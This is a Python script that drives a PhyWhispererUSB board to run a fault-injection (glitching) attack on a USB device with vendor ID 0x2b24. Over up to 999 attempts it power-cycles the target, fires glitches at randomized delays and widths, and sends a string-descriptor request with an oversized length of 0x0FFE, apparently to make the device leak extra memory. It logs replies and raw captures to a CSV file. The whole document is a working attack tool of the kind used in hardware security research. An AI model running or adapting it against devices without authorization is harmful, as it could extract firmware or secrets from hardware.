#!/usr/bin/env python3

import phywhisperer.usb as pw
import csv
import base64
import random
import pickle
import signal
import uuid
DESC_TYPE_STRING = 0x03

import usb
import usb.core
import usb.util
from sys import hexversion
from usb.control import get_descriptor

def sendRequest():
  d = usb.core.find(idVendor = 0x2b24,idProduct = 0x0001)
  buf = get_descriptor(d,0x0FFE,DESC_TYPE_STRING,d.iProduct,1033)
  return buf

f_csv = open("classifier-%s.csv" % uuid.uuid4(),"w")
spamwriter = csv.writer(f_csv,delimiter=',',quotechar='\"')

import sys

print("Configuring PhyWhispererUSB")
phy = pw.Usb()
phy.con(program_fpga = True)
phy.addpattern = True
phy.reset_fpga()
phy.set_power_source("off")

pattern_true = [0x80, 0x06, 0x02, 0x03, 0x09, 0x04,0xFE,0x0F]
print(pattern_true)
# print(pattern)
import time

quietMode = False
oneshot = False

# dx = 0.6558979765582688 # usb corruption.
# dx = 0.6519845071548444
# dx = 0.165299
dx = None

def sighandler(signum,frame):
  print("Exception handler hit!")
  raise Exception("bye")

signal.signal(signal.SIGALRM,sighandler)

# randomize in the phywhisperer. 
for i in range(1,1000):
  if dx is None:
    delay = random.randint(350,380)
  else:
    delay = random.uniform(dx - 0.05,dx + 0.05)
  width = random.randint(15,25)
  # width = random.randint(235,355)
  phy.set_capture_size(512)
  phy.set_pattern(pattern_true,mask=[0xff for c in pattern_true])
  phy.set_trigger(num_triggers=1,delays=[int(delay)],widths=[width])
  # phy.set_trigger(num_triggers=1,delays=[phy.ns_trigger(delay)],widths=[width])
  print("Preparing for attempt %d, glitch at %f, %d width" % (i,delay,width))
  phy.set_power_source("off")
  time.sleep(0.5)
  phy.set_power_source("host")
  time.sleep(3.0)
  print("-arm")
  phy.arm()
  time.sleep(0.2)
  data = ""
  try:
    buf = sendRequest()
  except:
    buf = None
  if buf is not None:
    try:
      blen = buf[0] & 0xfe
      if hexversion >= 0x03020000:
        _name = buf[2:blen].tobytes().decode("utf-16-le")
      else:
        _name = buf[2:blen].tostring().decode("utf-16-le")
      data = _name
      print(data)
    except:
      data = ""
  else:
    data = ""
  print("Waiting disarm")
  phy.wait_disarmed()
  raw = phy.read_capture_data()
  packets = phy.split_packets(raw)
  spamwriter.writerow([delay,width,data,base64.b64encode(pickle.dumps(raw))])
  printPackets = pw.USBSimplePrintSink(highspeed=phy.get_usb_mode() == 'HS')
  for packet in packets:
    # print(packet["contents"])
    if (len(packet["contents"]) == 3 and packet["contents"][0] == 165):
      continue
    printPackets.handle_usb_packet(ts=packet['timestamp'],buf=bytearray(packet['contents']),flags=0)

f_csv.close()
print("Done!")
sys.exit(0)

